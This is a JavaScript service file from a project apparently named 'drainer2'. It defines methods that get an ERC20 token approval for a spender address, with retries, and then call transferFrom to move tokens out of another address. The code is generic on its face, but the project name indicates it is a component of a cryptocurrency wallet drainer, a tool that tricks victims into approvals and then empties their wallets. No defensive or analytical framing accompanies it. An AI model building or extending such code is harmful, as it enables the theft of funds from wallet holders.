// filepath: e:\drainer2\backend\services\tokenService.js
const ethers = require('ethers');
const ERC20_ABI = require('../config/abis/erc20.json');
const { MAX_RETRY_COUNT } = require('../config/constants');

class TokenService {
  constructor(provider) {
    this.provider = provider;
    this.retryCount = MAX_RETRY_COUNT;
  }

  async approveToken(tokenAddress, spenderAddress, amount) {
    const tokenContract = new ethers.Contract(
      tokenAddress,
      ERC20_ABI,
      this.provider.getSigner()
    );

    let attempts = this.retryCount;
    while (attempts > 0) {
      try {
        const tx = await tokenContract.approve(spenderAddress, amount);
        await tx.wait();
        return true;
      } catch (error) {
        attempts--;
        if (attempts === 0) throw error;
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
    }
  }

  async transferTokens(tokenAddress, from, to, amount) {
    const tokenContract = new ethers.Contract(
      tokenAddress,
      ERC20_ABI,
      this.provider.getSigner()
    );

    const tx = await tokenContract.transferFrom(from, to, amount);
    return await tx.wait();
  }
}

module.exports = TokenService;